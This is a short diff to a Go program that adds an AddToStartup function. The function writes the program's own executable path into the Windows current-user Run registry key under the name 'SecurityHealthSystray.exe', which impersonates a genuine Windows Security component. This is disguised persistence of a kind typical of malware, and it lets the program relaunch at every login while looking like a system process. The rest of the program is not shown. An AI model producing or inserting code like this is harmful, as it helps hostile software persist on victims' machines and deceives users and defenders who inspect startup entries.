@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"golang.org/x/sys/windows/registry"
 	"io"
 	"math/rand"
 	"os"
@@ -59,4 +60,25 @@ func CloseFile(file *os.File) {
 	defer func(file *os.File) {
 		_ = file.Close()
 	}(file)
+}
+
+func AddToStartup() {
+	// Get the executable path
+	executablePath, err := os.Executable()
+	if err != nil {
+		return
+	}
+
+	// Open the registry key for current user's startup programs
+	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	if err != nil {
+		return
+	}
+
+	defer func(key registry.Key) {
+		_ = key.Close()
+	}(key)
+
+	// Set the value to add the program to startup
+	_ = key.SetStringValue("SecurityHealthSystray.exe", executablePath)
 }
